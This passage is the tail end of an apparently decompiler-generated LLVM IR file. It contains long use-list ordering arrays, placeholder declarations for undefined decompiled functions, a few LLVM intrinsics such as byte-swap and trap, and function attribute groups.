319, 796, 797, 798, 799, 245, 244, 800, 801, 802, 559, 294, 803, 99, 100, 295, 804, 97, 98, 418, 806, 807, 549, 808, 809, 810, 811, 812, 419, 813, 814, 815, 152, 551, 816, 817, 818, 550, 819, 820, 420, 821, 822, 825, 826, 827, 246, 823, 247, 824, 248, 805, 962, 963, 19, 828, 421, 829, 831, 249, 832, 833, 834, 835, 836, 837, 838, 251, 250, 839, 422, 840, 423, 841, 424, 830, 842, 330, 845, 252, 425, 846, 426, 843, 844, 427, 253, 254, 81, 255, 848, 849, 115, 116, 82, 850, 256, 257, 298, 851, 259, 852, 260, 258, 428, 853, 854, 856, 855, 857, 261, 858, 859, 363, 860, 861, 862, 262, 263, 863, 264, 864, 265, 865, 266, 866, 867, 107, 868, 869, 267, 870, 871, 872, 268, 874, 269, 299, 875, 873, 876, 877, 878, 270, 879, 883, 272, 885, 886, 271, 884, 887, 147, 430, 431, 888, 889, 432, 433, 890, 429, 891, 892, 273, 893, 894, 274, 275, 895, 896, 148, 897, 898, 20, 21, 22, 23, 899, 900, 276, 365, 901, 902, 434, 903, 435, 904, 436, 905, 437, 906, 438, 907, 439, 908, 364, 909, 440, 910, 911, 912, 277, 914, 915, 278, 300, 916, 913, 917, 918, 919, 24, 25, 26, 920, 279, 921, 926, 927, 66, 928, 280, 929, 930, 281, 301, 932, 931, 441, 933, 935, 936, 937, 938, 442, 939, 27, 28, 29, 934, 30, 31, 940, 282, 941, 942, 283, 945, 946, 947, 302, 948, 943, 944, 950, 949, 951, 284, 952, 964, 965, 285, 967, 968, 969, 286, 443, 971, 970, 966, 973, 974, 972, 975, 287, 976, 331, 1050, 149, 560, 444, 1051, 67, 1052, 117, 1053, 1054, 1055, 332, 1056, 445, 1057, 1058, 1059, 41, 321, 1060, 1061, 1071, 288, 1072, 1079, 289, 1080, 290, 1081, 1330, 366, 588, 367, 368, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 489, 490, 491, 492, 493, 494, 495, 496, 497, 498, 499, 500, 501, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 1331, 1332, 1333, 1334, 1335, 1336, 1337, 1338, 1339, 1340, 1341, 1342, 1343, 1344, 1345 }
  uselistorder i32* @r4, { 92, 773, 774, 775, 776, 777, 795, 778, 779, 780, 781, 782, 783, 784, 785, 786, 787, 788, 789, 790, 791, 7, 792, 793, 794, 796, 797, 798, 799, 800, 801, 802, 803, 100, 101, 102, 103, 146, 8, 147, 148, 149, 9, 150, 151, 152, 153, 154, 155, 156, 0, 10, 157, 158, 159, 160, 161, 162, 163, 164, 223, 224, 232, 93, 804, 94, 95, 96, 806, 807, 808, 3, 811, 52, 805, 767, 768, 104, 105, 106, 107, 108, 109, 110, 111, 112, 812, 813, 165, 166, 11, 2, 167, 814, 815, 816, 817, 818, 819, 820, 821, 822, 823, 824, 825, 826, 827, 828, 829, 12, 168, 169, 170, 171, 172, 173, 174, 175, 194, 13, 195, 196, 176, 177, 179, 14, 180, 183, 15, 184, 185, 16, 186, 187, 17, 188, 189, 18, 190, 191, 19, 192, 49, 193, 178, 197, 20, 198, 199, 200, 201, 202, 203, 204, 181, 182, 97, 98, 99, 113, 114, 115, 116, 21, 117, 22, 23, 118, 119, 120, 121, 122, 123, 124, 129, 130, 24, 131, 132, 25, 133, 134, 26, 135, 136, 27, 137, 138, 28, 139, 140, 29, 141, 142, 125, 126, 127, 128, 143, 144, 145, 205, 206, 207, 30, 208, 209, 210, 31, 211, 212, 213, 214, 215, 216, 47, 217, 218, 219, 220, 221, 222, 225, 226, 227, 228, 229, 230, 231, 233, 234, 235, 6, 236, 237, 238, 239, 809, 810, 244, 245, 246, 247, 248, 249, 655, 656, 830, 831, 832, 657, 658, 51, 836, 48, 837, 838, 839, 855, 857, 858, 859, 856, 840, 845, 853, 854, 833, 846, 847, 848, 849, 53, 54, 55, 56, 250, 251, 4, 32, 252, 33, 253, 254, 255, 841, 842, 659, 84, 85, 86, 87, 88, 89, 834, 835, 843, 844, 240, 241, 242, 243, 660, 664, 665, 666, 667, 668, 669, 670, 671, 672, 673, 674, 675, 34, 676, 677, 678, 679, 661, 662, 663, 680, 681, 682, 683, 684, 685, 686, 687, 688, 35, 689, 690, 691, 692, 693, 694, 695, 696, 697, 698, 720, 721, 699, 700, 701, 702, 703, 704, 705, 706, 707, 708, 709, 710, 711, 50, 712, 713, 1, 714, 715, 716, 717, 718, 719, 256, 257, 258, 614, 615, 616, 617, 618, 621, 622, 623, 57, 619, 620, 466, 467, 468, 469, 470, 471, 472, 550, 551, 552, 555, 556, 557, 553, 554, 259, 260, 261, 262, 263, 264, 265, 58, 266, 267, 558, 559, 560, 561, 562, 563, 564, 268, 269, 270, 271, 272, 273, 274, 59, 275, 276, 277, 280, 281, 282, 278, 279, 283, 284, 285, 286, 287, 288, 850, 851, 852, 289, 290, 291, 292, 293, 294, 624, 625, 626, 627, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 295, 296, 297, 298, 82, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 83, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 363, 364, 365, 366, 367, 368, 5, 357, 358, 359, 360, 361, 362, 313, 314, 315, 316, 628, 629, 630, 631, 632, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 381, 388, 389, 390, 391, 392, 393, 382, 383, 384, 385, 386, 387, 90, 394, 395, 396, 397, 398, 405, 399, 400, 401, 402, 403, 404, 406, 407, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 441, 442, 443, 444, 445, 446, 447, 448, 449, 36, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 462, 463, 464, 465, 37, 473, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 484, 38, 485, 39, 486, 40, 487, 488, 489, 490, 491, 492, 493, 494, 495, 496, 497, 498, 499, 500, 501, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 41, 513, 42, 514, 43, 515, 44, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 45, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 613, 633, 634, 635, 636, 46, 637, 638, 639, 640, 641, 642, 643, 644, 645, 646, 647, 648, 649, 650, 651, 652, 653, 654, 722, 723, 724, 725, 726, 727, 728, 729, 730, 731, 732, 733, 734, 735, 736, 737, 738, 739, 740, 741, 742, 743, 744, 745, 746, 747, 748, 749, 750, 751, 752, 753, 757, 754, 755, 756, 758, 759, 760, 761, 762, 763, 764, 765, 766, 769, 770, 771, 91, 772 }
}

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i16* @__decompiler_undefined_function_1() local_unnamed_addr

declare i16 @__decompiler_undefined_function_2() local_unnamed_addr

declare i8 @__decompiler_undefined_function_3() local_unnamed_addr

declare i8* @__decompiler_undefined_function_4() local_unnamed_addr

declare i64* @__decompiler_undefined_function_5() local_unnamed_addr

declare %vfp_regs @__decompiler_undefined_function_6() local_unnamed_addr

declare %anon_struct_4 @__decompiler_undefined_function_7() local_unnamed_addr

declare %anon_struct_13.3 @__decompiler_undefined_function_8() local_unnamed_addr

declare %anon_struct_13 @__decompiler_undefined_function_9() local_unnamed_addr

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

; Function Attrs: noreturn nounwind
declare void @llvm.trap() #2

; Function Attrs: nounwind readnone
declare i16 @llvm.bswap.i16(i16) #1

declare float @fabsf(float)

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
attributes #2 = { noreturn nounwind }
